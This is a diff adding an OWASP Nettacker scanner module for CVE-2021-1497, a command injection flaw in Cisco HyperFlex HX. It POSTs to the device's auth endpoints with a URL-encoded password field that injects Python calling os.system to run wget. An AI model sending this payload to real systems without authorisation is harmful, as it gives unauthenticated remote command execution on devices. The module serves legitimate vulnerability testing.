@@ -1,0 +1,57 @@
+info:
+  name: cisco_hyperflex_cve_2021_1497_vuln
+  author: OWASP Nettacker Team
+  severity: 9.8
+  description: Multiple vulnerabilities in the web-based management interface of Cisco HyperFlex HX could allow an unauthenticated, remote attacker to perform command injection attacks against an affected device.
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-1497
+    - https://packetstormsecurity.com/files/162976/Cisco-HyperFlex-HX-Data-Platform-Command-Execution.html
+  profiles:
+    - vuln
+    - vulnerability
+    - http
+    - high_severity
+    - cve
+    - hyperflex
+    - cisco
+
+payloads:
+  - library: http
+    verify: false
+    timeout: 10
+    cert: ""
+    stream: false
+    proxies: ""
+    steps:
+      - method: post
+        headers:
+          Accept: "*/*"
+          Content-Type: application/x-www-form-urlencoded
+          User-Agent: "{user_agent}"
+        allow_redirects: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/{{paths}}"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              paths:
+                - 'auth/change'
+                - 'auth'
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+        data: username=root&password=123%5C%22%2C%5C%22%246%24%24%5C%22%29%29%3Bimport%20os%3Bos.system%28%5C%22wget%20http%3A%2F%2F%7B%7B{target}%7D%7D%5C%22%29%3Bprint%28crypt.crypt%28%5C%22
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "200"
+              reverse: false
+            content:
+              regex: "http"
+              reverse: false
